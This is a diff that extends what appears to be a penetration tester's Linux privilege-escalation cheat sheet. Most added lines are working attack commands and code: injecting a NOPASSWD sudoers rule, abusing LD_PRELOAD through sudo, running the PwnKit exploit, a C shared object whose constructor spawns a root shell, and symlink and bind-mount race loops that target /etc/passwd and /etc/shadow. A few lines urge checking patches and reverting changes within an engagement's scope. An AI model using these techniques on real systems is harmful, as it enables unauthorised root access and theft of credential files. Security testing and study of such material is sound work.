@@ -91,7 +91,7 @@ tar cf /dev/null *
 ## sudo Exploitation
 
 ```bash
-# Check what we can run
+# Check what we can run (full form — look at env tags too)
 sudo -l
 
 # If (ALL) NOPASSWD → full privesc
@@ -108,7 +108,42 @@ sudo -u otheruser /bin/bash
 sudo --version
 # CVE-2021-3156 (Baron Samedit) < 1.9.5p2
 # CVE-2019-14287 (ALL, !root) < 1.8.28
+# CVE-2023-22809 (sudoedit) < 1.9.12p2 — sudoedit honors user-controlled SUDO_EDITOR
 ```
+
+### sudoers and rule abuse
+
+```bash
+# Writable /etc/sudoers or included drop-ins → inject a rule
+ls -la /etc/sudoers /etc/sudoers.d/
+echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/pwned 2>/dev/null
+
+# (root) with env_reset off / SETENV tag → LD_PRELOAD through sudo
+sudo -l | grep -E 'SETENV|env_keep'
+sudo LD_PRELOAD=/tmp/shell.so <allowed-program>
+
+# Wildcard command rules run arbitrary subcommands
+# %group ALL=(root) /usr/bin/tar → GTFOBins tar escape
+
+# sudoedit file-read primitive: sudoedit on any file the rule permits
+# writes; combined with CVE-2023-22809 the -- argument permits arbitrary files
+```
+
+## PwnKit (CVE-2021-4034, polkit pkexec)
+
+SUID `pkexec` on essentially every distro before the 2022-01 patch — one
+command to root:
+
+```bash
+ls -la /usr/bin/pkexec   # look for the SUID bit
+uname -r                 # pre-2022 kernels ship vulnerable polkit
+
+# Public PoC (cve-2021-4034) compiled in the sandbox or uploaded
+./pwnkit                 # drops straight into a root shell
+```
+
+Verify the patch (`dpkg -l policykit-1` / `rpm -q polkit`) before claiming
+exploitability; on patched hosts pkexec just errors out.
 
 ## Capabilities Abuse
 
@@ -231,3 +266,123 @@ echo 'chmod +s /bin/bash' > /mnt/nfs/exploit.c
 # Compile with static linking on attack host, execute on target
 gcc -static -o /mnt/nfs/exploit /mnt/nfs/exploit.c
 ```
+
+## LD_PRELOAD / ld.so.preload
+
+Runs before every dynamic binary — a root-owned process then executes your
+library:
+
+```bash
+# Writable /etc/ld.so.preload or sudo env_keep LD_PRELOAD
+cat /etc/ld.so.preload 2>/dev/null
+
+# Shared object whose constructor executes as the loading user
+cat > /tmp/shell.c << 'EOF'
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() { setgid(0); setuid(0); system("/bin/bash -p"); }
+EOF
+gcc -shared -fPIC -o /tmp/shell.so /tmp/shell.c -nostartfiles
+
+# Trigger via any root-run program (cron, service restart, sudo env path)
+```
+
+Record `/etc/ld.so.preload` edits as engagement artifacts — they affect every
+binary on the host and must be reverted exactly.
+
+## Kernel exploit discipline
+
+Treat kernel exploits as last resort: they can panic or wedge a production
+host. Before running one, confirm the running kernel matches the CVE range
+(`uname -r`), snapshot what a crash would cost the engagement, and prefer
+userspace paths (SUID/sudo/services) when they exist. Escalate via kernel
+only when host stability risk is acceptable within scope.
+
+## Local TOCTOU (time-of-check to time-of-use)
+
+## The Core Pattern
+
+```c
+// Vulnerable
+if (access(path, W_OK) == 0) {     // check  — resolves "path" now
+    fd = open(path, O_WRONLY);     // use    — re-resolves "path" later
+    write(fd, attacker_data, n);
+}
+```
+
+Between `access` and `open`, an attacker replaces `path` with a symlink to `/etc/shadow`. The check sees an attacker-owned file; the use opens shadow as root.
+
+The fix is always: **operate on the kernel object, not the path.** Use `O_NOFOLLOW`, `openat` with `AT_SYMLINK_NOFOLLOW`, `fstat` on the FD, etc.
+
+---
+
+## Filesystem TOCTOU
+
+### Symlink Swap (Classic)
+
+```bash
+# Setup target — privileged binary that writes to user-supplied path after access() check
+victim --output /tmp/.attacker/output
+
+# Race loop
+while true; do
+  ln -sf /etc/passwd /tmp/.attacker/output 2>/dev/null
+  ln -sf /tmp/.attacker/legit /tmp/.attacker/output 2>/dev/null
+done &
+
+# Run victim repeatedly
+while true; do victim --output /tmp/.attacker/output; done
+```
+
+### renameat2(RENAME_EXCHANGE) — Atomic Single-Frame Swap
+
+```c
+syscall(SYS_renameat2, AT_FDCWD, "good", AT_FDCWD, "bad", RENAME_EXCHANGE);
+```
+
+`RENAME_EXCHANGE` swaps two paths atomically — combined with FUSE-paused dir lookups, this is a near-deterministic primitive on Linux ≥ 3.15.
+
+### Directory Swap (mv between two prepared trees)
+
+When the victim resolves `parent/file`, swap `parent` itself:
+
+```bash
+mv good_dir parent && mv evil_dir parent_was_good_dir
+# If victim is mid-resolution of `parent/file`, dir cache may pin one side
+```
+
+### Bind Mount / Mount-Namespace Swap (root-only or in user-ns)
+
+```bash
+unshare -mUr
+mkdir /tmp/x /tmp/y
+echo benign > /tmp/x/file
+mount --bind /etc/shadow /tmp/y/file
+# Then: while true; do mount --move /tmp/x /tmp/m; mount --move /tmp/y /tmp/m; done
+```
+
+In containerized contexts with `CAP_SYS_ADMIN` in a user namespace, this is the foundation of multiple runc/CVE escape chains.
+
+---
+
+## Setuid Binary TOCTOU
+
+```c
+// Vulnerable flow in classic SUID binary
+if (!access(file, R_OK)) {       // check with real UID via access()
+    fd = open(file, O_RDONLY);   // open with effective UID = root
+    sendfile(stdout, fd, ...);
+}
+```
+
+Symlink swap between `access` and `open` makes the binary read root-readable files for unprivileged users.
+
+**Rule of thumb when reviewing setuid/setgid binaries:** every path appearing twice in a syscall trace is a candidate.
+
+```bash
+strace -f -e openat,access,stat,lstat,readlink ./suid_binary 2>&1 | grep "$user_input"
+# Multiple resolutions of the same user-controlled path = TOCTOU surface
+```
+
+---
